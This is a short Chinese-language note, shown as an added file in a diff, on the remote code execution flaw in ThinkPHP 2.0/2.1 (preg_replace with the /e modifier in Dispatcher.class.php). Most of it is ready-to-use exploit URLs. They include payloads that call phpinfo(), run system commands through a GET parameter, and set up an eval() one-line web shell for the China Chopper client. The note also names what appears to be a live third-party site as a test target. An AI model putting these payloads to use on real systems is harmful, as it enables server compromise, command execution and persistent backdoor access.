@@ -1,0 +1,33 @@
+ThinkPHP 漏洞
+2.0版本 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php
+
+
+2.1版本/ThinkPHP/Lib/Core/Dispatcher.class.php
+
+搜索preg_replace 有一段替换使用了/e模式, 而且thinkphp底层没有提供参数的过滤， 这边就直接崩溃了。
+
+测试代码
+
+/index.php/Module/Action/Param/${@phpinfo()}
+
+http://www.js.10086.cn/wxcs/ppo/YC/index.php/Public/MedInsurance/1/%7B$%7Bphpinfo()%7D%7D
+
+/admin//index.php/public/login
+去掉login 版本信息出来
+
+最近thinkphp框架爆出了一个任意代码执行漏洞，其威胁程序相当的高,漏洞利用方法如下：
+
+index.php/module/aciton/param1/${@print(THINK_VERSION)}index.php
+
+/module/aciton/param1/${@function_all()}
+其中function_all代表任何函数，
+
+比如:index.php/module/aciton/param1/${@phpinfo()}
+获取服务器的系统配置信息等。
+
+index.php/module/action/param1/{${system($_GET['x'])}}?x=ls -al
+列出网站文件列表
+
+index.php/module/action/param1/{${eval($_POST[s])}}
+直接执行一句话代码，用菜刀直接连接.
+
